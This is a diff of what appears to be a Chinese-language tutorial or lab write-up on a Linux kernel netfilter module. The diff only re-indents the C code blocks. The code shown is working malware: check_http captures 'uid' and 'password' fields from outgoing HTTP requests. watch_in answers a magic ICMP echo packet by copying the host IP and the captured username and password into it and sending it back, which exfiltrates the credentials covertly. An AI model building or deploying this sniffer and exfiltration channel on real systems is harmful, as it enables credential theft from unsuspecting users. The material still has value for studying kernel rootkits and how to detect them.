@@ -79,7 +79,7 @@ ubuntu 18.04 kernel 4.15
         nf_register_net_hook(&init_net,&pre_hook);
         nf_register_net_hook(&init_net,&post_hook);
         return 0;
-
+    }
  ```
   
  #### 3. 在target内核用netfilter过滤发出去http包，发现port=80的http包，就调用check_http（）
@@ -117,58 +117,59 @@ ubuntu 18.04 kernel 4.15
 ```c
     static void check_http(struct sk_buff *skb)
     {
-    struct tcphdr *tcp;
-    char *data;
-    char *name;
-    char *passwd;
-    char *_and;
-    char *check_connection;
-    int len,i;
-    tcp = tcp_hdr(skb);
-    data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
- 
-    if (strstr(data,"Connection") != NULL && strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) {
-    check_connection = strstr(data,"Connection");
-    printk("find connection uid password");
-    
-    name = strstr(check_connection,"&uid=");
-    name += 5;
-    _and = strstr(name,"&");
-    len = _and - name;
-    if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
-    return;
-    memset(username, 0x00, len + 2);
-    for (i = 0; i < len; ++i)
-    {
-    *(username + i) = name[i];
-    }
-    *(username + len) = '\0';
-    
-    passwd = strstr(name,"&password=");
-    passwd += 10;
-    _and = strstr(passwd,"&");
-    len = _and - passwd;
-    if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
-    return;
-    memset(password, 0x00, len + 2);
-    for (i = 0; i < len; ++i)
-    {
-    *(password + i) = passwd[i];
-    }
-    *(password + len) = '\0';
-    } else {
-    printk("it`s not a http post");
-    return;
-    }
-    
-    if (!target_ip)
-    target_ip = ip_hdr(skb)->daddr;
-    if (!target_port)
-    target_port = tcp->source;
-    if (username && password)
-    have_pair++; 
-    if (have_pair)
-    printk("Have a uid&pwd pair! U: %s P: %s\n", username, password);
+        struct tcphdr *tcp;
+        char *data;
+        char *name;
+        char *passwd;
+        char *_and;
+        char *check_connection;
+        int len,i;
+        tcp = tcp_hdr(skb);
+        data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
+
+        if (strstr(data,"Connection") != NULL && strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) 
+        {
+            check_connection = strstr(data,"Connection");
+            printk("find connection uid password");
+
+            name = strstr(check_connection,"&uid=");
+            name += 5;
+            _and = strstr(name,"&");
+            len = _and - name;
+            if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+                return;
+            memset(username, 0x00, len + 2);
+            for (i = 0; i < len; ++i)
+            {
+                *(username + i) = name[i];
+            }
+            *(username + len) = '\0';
+
+            passwd = strstr(name,"&password=");
+            passwd += 10;
+            _and = strstr(passwd,"&");
+            len = _and - passwd;
+            if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
+                return;
+            memset(password, 0x00, len + 2);
+            for (i = 0; i < len; ++i)
+            {
+                *(password + i) = passwd[i];
+            }
+                *(password + len) = '\0';
+            } else {
+                printk("it`s not a http post");
+            return;
+        }
+
+        if (!target_ip)
+            target_ip = ip_hdr(skb)->daddr;
+        if (!target_port)
+            target_port = tcp->source;
+        if (username && password)
+            have_pair++; 
+        if (have_pair)
+            printk("Have a uid&pwd pair! U: %s P: %s\n", username, password);
     }
 
  ```
@@ -180,84 +181,83 @@ ubuntu 18.04 kernel 4.15
     static unsigned int watch_in(void *priv, struct sk_buff *skb,
     const struct nf_hook_state *state)
     {
-    struct sk_buff *sb = skb;
-    struct icmphdr *icmp;
-    char *cp_data;    /* Where we copy data to in reply */
-    unsigned int taddr;   /* Temporary IP holder */
-    printk("pre routing");
-    /* Do we even have a username/password pair to report yet? */
-    if (!have_pair)
-    return NF_ACCEPT;
-    /* Is this an ICMP packet? */
-    if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
-    return NF_ACCEPT;
-    icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4); //+20 ip头
-    /* Is it the MAGIC packet? */
-    if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
-    || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
-    printk("it`s not a MAGIC packet");
-    return NF_ACCEPT;
-    }
-    /* 直接修改 接收 的buffer
-    * Okay, matches our checks for "Magicness", now we fiddle with
-    * the sk_buff to insert the IP address, and username/password pair,
-    * swap IP source and destination addresses and ethernet addresses
-    * if necessary and then transmit the packet from here and tell
-    * Netfilter we stole it. Phew... */
-    printk("get the MAGIC packet");
-    /*交换src dst 的ip*/
-    taddr = ip_hdr(sb)->saddr;
-    ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
-    ip_hdr(sb)->daddr = taddr;
-    sb->pkt_type = PACKET_OUTGOING;
-    //设置mac
-    switch (sb->dev->type) {
-    case ARPHRD_PPP:     /* Ntcho iddling needs doing */
-    break;
-    case ARPHRD_LOOPBACK:
-    case ARPHRD_ETHER:
-      {
-       unsigned char t_hwaddr[ETH_ALEN];
+        struct sk_buff *sb = skb;
+        struct icmphdr *icmp;
+        char *cp_data;    /* Where we copy data to in reply */
+        unsigned int taddr;   /* Temporary IP holder */
+        printk("pre routing");
+        /* Do we even have a username/password pair to report yet? */
+        if (!have_pair)
+            return NF_ACCEPT;
+        /* Is this an ICMP packet? */
+        if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
+        return NF_ACCEPT;
+        icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4); //+20 ip头
+        /* Is it the MAGIC packet? */
+        if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
+        || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
+        printk("it`s not a MAGIC packet");
+        return NF_ACCEPT;
+        }
+        /* 直接修改 接收 的buffer
+        * Okay, matches our checks for "Magicness", now we fiddle with
+        * the sk_buff to insert the IP address, and username/password pair,
+        * swap IP source and destination addresses and ethernet addresses
+        * if necessary and then transmit the packet from here and tell
+        * Netfilter we stole it. Phew... */
+        printk("get the MAGIC packet");
+        /*交换src dst 的ip*/
+        taddr = ip_hdr(sb)->saddr;
+        ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
+        ip_hdr(sb)->daddr = taddr;
+        sb->pkt_type = PACKET_OUTGOING;
+        //设置mac
+        switch (sb->dev->type) {
+        case ARPHRD_PPP:     /* Ntcho iddling needs doing */
+        break;
+        case ARPHRD_LOOPBACK:
+        case ARPHRD_ETHER:
+          {
+           unsigned char t_hwaddr[ETH_ALEN];
 
-       /* Move the data pointer to point to the link layer header */
-    /*将源MAC设置为目的MAC*/
-       sb->data = (unsigned char *)eth_hdr(sb);
-       sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
-       memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
-       memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
-         ETH_ALEN);
-       memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
-      break;
-      }
-    };
-    /* Now copy the 自身的IP address, then Username, then password into packet */
-    /*(char *)icmp 是为了保证指针移动的标准是char* ，64位OS中是8字节*/
-    cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
-    memcpy(cp_data, &target_ip, 4);
-    if (username)
-    //memcpy(cp_data + 4, username, 16);
-    memcpy(cp_data + 4, username, 16);
-    if (password)
-    memcpy(cp_data + 20, password, 16);
-    /*
-    * This is where things will die if they are going to.
-    * Fingers crossed...
-    * 发送 buffer
-    * A negative errno code is returned on a failure.
-    * A success does not guarantee the frame will be transmitted
-    * as it may be dropped due to congestion or traffic shaping.*/
-    dev_queue_xmit(sb);
-    printk("the pair has been send to target");
-    /* Now free the saved username and password and reset have_pair */
-    kfree(username);
-    kfree(password);
-    username = password = NULL;
-    have_pair = 0;
-    target_port = target_ip = 0;
-    printk("clear the pair\n");
-    /* 不能return NF_DROP，因为dev_queue_xmit将释放缓冲区，
-    * Netfilter将尝试对NF_DROPped数据包执行相同操作，导致内核错误。*/
-    return NF_STOLEN;
+           /*将源MAC设置为目的MAC*/
+           sb->data = (unsigned char *)eth_hdr(sb);
+           sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
+           memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
+           memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
+             ETH_ALEN);
+           memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
+          break;
+          }
+        };
+        /* Now copy the 自身的IP address, then Username, then password into packet */
+        /*(char *)icmp 是为了保证指针移动的标准是char* ，64位OS中是8字节*/
+        cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
+        memcpy(cp_data, &target_ip, 4);
+        if (username)
+        //memcpy(cp_data + 4, username, 16);
+            memcpy(cp_data + 4, username, 16);
+        if (password)
+            memcpy(cp_data + 20, password, 16);
+        /*
+        * This is where things will die if they are going to.
+        * Fingers crossed...
+        * 发送 buffer
+        * A negative errno code is returned on a failure.
+        * A success does not guarantee the frame will be transmitted
+        * as it may be dropped due to congestion or traffic shaping.*/
+        dev_queue_xmit(sb);
+        printk("the pair has been send to target");
+        /* Now free the saved username and password and reset have_pair */
+        kfree(username);
+        kfree(password);
+        username = password = NULL;
+        have_pair = 0;
+        target_port = target_ip = 0;
+        printk("clear the pair\n");
+        /* 不能return NF_DROP，因为dev_queue_xmit将释放缓冲区，
+        * Netfilter将尝试对NF_DROPped数据包执行相同操作，导致内核错误。*/
+        return NF_STOLEN;
     }
 
 
@@ -267,14 +267,14 @@ ubuntu 18.04 kernel 4.15
  ```c
     void cleanup_module()
     {
-    //struct net *net=NULL;
-    nf_unregister_net_hook(&init_net,&post_hook);
-    nf_unregister_net_hook(&init_net,&pre_hook);
-    if (password)
-    kfree(password);
-    if (username)
-    kfree(username);
-    return;
+        //struct net *net=NULL;
+        nf_unregister_net_hook(&init_net,&post_hook);
+        nf_unregister_net_hook(&init_net,&pre_hook);
+        if (password)
+        kfree(password);
+        if (username)
+        kfree(username);
+        return;
     }
     
  ```
